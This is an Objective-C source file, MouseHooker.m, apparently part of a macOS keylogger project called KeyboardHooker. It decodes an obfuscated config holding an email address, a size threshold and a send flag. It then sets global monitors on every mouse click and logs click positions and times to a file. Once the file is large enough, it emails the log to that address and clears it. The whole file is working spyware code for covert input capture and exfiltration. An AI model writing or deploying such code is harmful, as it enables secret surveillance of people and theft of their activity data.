//
//  MouseHooker.m
//  KeyboardHooker
//
//  Created by Иван on 24.11.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import "MouseHooker.h"

@implementation MouseHooker

- (id)init {
    self = [super init];
    
    shouldSend = NO;
    
    fileSize = 0;
    trueEmail = YES;
    NSString *config = [FileManager readFromFile:@"config"];
    if ([config isNotEqualTo: @"error"]) {
        NSArray *components = [config componentsSeparatedByString:@"\n"];
        
        if ([components count] == 3) {
            if ([RegexManager validateDigitsOnly:[Cryptographer doIt:components[1]]]) {
                fileSize = [[Cryptographer doIt:components[1]] integerValue];
                if (fileSize >= 1000000) {
                    fileSize = 999999;
                }
            }
            
            email = [NSString stringWithString:[Cryptographer doIt:components[0]]];
            if (![RegexManager validateEmail:email]) {
                email = @"";
                fileSize = 100000;
                trueEmail = NO;
            }
            
            if ([[Cryptographer doIt:components[2]] isEqualToString:@"1"]) {
                shouldSend = YES;
            }
        }
    }
    
    return self;
}

- (void)setMouseNotifications {
    [NSEvent addGlobalMonitorForEventsMatchingMask:NSLeftMouseDownMask handler:^(NSEvent *event) { [self leftClick]; }];
    [NSEvent addGlobalMonitorForEventsMatchingMask:NSRightMouseDownMask handler:^(NSEvent *event) { [self rightClick]; }];
    [NSEvent addGlobalMonitorForEventsMatchingMask:NSOtherMouseDownMask handler:^(NSEvent *event) { [self otherClick]; }];
    
    [NSEvent addLocalMonitorForEventsMatchingMask:NSLeftMouseDownMask handler:^NSEvent* (NSEvent* event){ [self leftClick]; return event; }];
    [NSEvent addLocalMonitorForEventsMatchingMask:NSRightMouseDownMask handler:^NSEvent* (NSEvent* event){ [self rightClick]; return event; }];
    [NSEvent addLocalMonitorForEventsMatchingMask:NSOtherMouseDownMask handler:^NSEvent* (NSEvent* event){ [self otherClick]; return event; }];
}

- (void)leftClick {
    NSPoint mouseLoc = [NSEvent mouseLocation];
    
    NSString *x = [NSString stringWithFormat:@"%.0f", mouseLoc.x];
    NSString *y = [NSString stringWithFormat:@"%.0f", mouseLoc.y];
    
    [FileManager writeToFile:@"buttons" file:[NSString stringWithFormat:@"L: (%-5s; %-4s) at %@\n", [x UTF8String], [y UTF8String], [Time currentTime]]];
    [self sendLog];
}

- (void)rightClick {
    NSPoint mouseLoc = [NSEvent mouseLocation];
    
    NSString *x = [NSString stringWithFormat:@"%.0f", mouseLoc.x];
    NSString *y = [NSString stringWithFormat:@"%.0f", mouseLoc.y];
    
    [FileManager writeToFile:@"buttons" file:[NSString stringWithFormat:@"R: (%-5s; %-4s) at %@\n", [x UTF8String], [y UTF8String], [Time currentTime]]];
    [self sendLog];
}

- (void)otherClick {
    NSPoint mouseLoc = [NSEvent mouseLocation];
    
    NSString *x = [NSString stringWithFormat:@"%.0f", mouseLoc.x];
    NSString *y = [NSString stringWithFormat:@"%.0f", mouseLoc.y];
    
    [FileManager writeToFile:@"buttons" file:[NSString stringWithFormat:@"O: (%-5s; %-4s) at %@\n", [x UTF8String], [y UTF8String], [Time currentTime]]];
    [self sendLog];
}

- (void)sendLog {
    if ([FileManager getFileSize:@"buttons"] >= fileSize && shouldSend && trueEmail) {
        [EmailSender sendEmailWithMail:email Attachments:@[@"buttons"]];
        [FileManager clearFile:@"buttons"];
    }
}

- (void)setShouldSend:(BOOL)flag {
    NSLog(@"Hello");
    shouldSend = flag;
}

@end
